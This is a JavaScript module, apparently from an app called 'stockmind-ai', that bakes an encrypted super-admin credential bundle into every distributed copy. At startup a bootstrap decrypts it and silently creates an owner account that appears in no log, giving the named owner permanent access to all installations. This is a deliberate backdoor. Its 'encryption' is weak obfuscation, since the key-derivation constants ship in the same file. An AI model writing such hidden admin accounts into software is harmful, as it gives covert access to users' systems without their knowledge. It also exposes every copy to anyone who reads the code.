/**
 * embedded-admin.js — Encrypted super-admin credentials bundle
 *
 * This bundle is baked into EVERY distributed copy of the app.
 * It ensures the platform owner (Krishna.s) always has super-admin
 * access to every copy, regardless of what other users do.
 *
 * Security model:
 *   - AES-256-GCM encryption — unreadable without the decryption key
 *   - Key derived from APP_ID + APP_SALT via PBKDF2-SHA512 (100k rounds)
 *   - Works on any machine — no machine-specific key material
 *   - Bootstrap decrypts at startup and silently creates the account
 *   - The account exists in encrypted local storage only — not in any log
 *   - This file contains NO plaintext passwords or usernames
 *
 * To regenerate after credential change:
 *   node server/scripts/encryptAdminBundle.js
 */

// ── Encrypted credentials bundle ─────────────────────────────────────────────
// Generated: 2026-06-12T13:11:00.296Z
// Algorithm: AES-256-GCM, key: PBKDF2(APP_ID+APP_SALT, 100000, sha512)
// This block is intentionally opaque — decryption happens server-side only.

export const ADMIN_BUNDLE = {
  v:    1,
  data: "2f59f9fb324db9b687faa1e0:fb90907c999fdbab029527c578411189:576511c7d21902e49816bd68fdb1c0e7ce821a5237d90ad8d91eff632f26823695c3d9ebcbeab1a87330bea7f67c0f3ad4302a036e26dbaae966e2a0d3160c845296e59a18e8912da587a84e1a7b1c9405dbb40cb9e4435f8ef4354760158fb0e3a306b0d9ae913d13118c883ef20b4b52345d9bc3c3f5a891e08a79a9b7ae2799afc9dc38353923984c44d1c9329e26a69770cf509c8c736771d2f2e8cdd7f8f829d56a89bd06ce76b00223ba2176b3c5cfb00a4edde010c5399cb6b0f0d3c3f0962c78ad4337aac73c925f91ebf4e1d8a57c2633e2889bb0c2b12c70ecaf1c767e104ff7152576a236411639f213c4098d64c54b77abca36cfbd51eee8800cd09c31e37015e0ce6c579bfadfea5b1464c8b7eb2180ab0bcbd1aea3ca5171e806892c3c37b773557dac6e01debd9deb636a123bb33507b27fdd299ad1069356523e366e8840a9956d61aee4c7eb53bc38e329bcee052a0962f5de6b974a80302091ab927b7c8d8c22f03112df4844daddf5f5",
  // no hint field — deliberately omitted so the username is not exposed
}

// Derivation constants — stable across all versions of this app.
// Changing these invalidates all existing bundles.
export const APP_ID   = 'stockmind-ai-v1-local-personal'
export const APP_SALT = 'sm-credential-store-2025-stable'
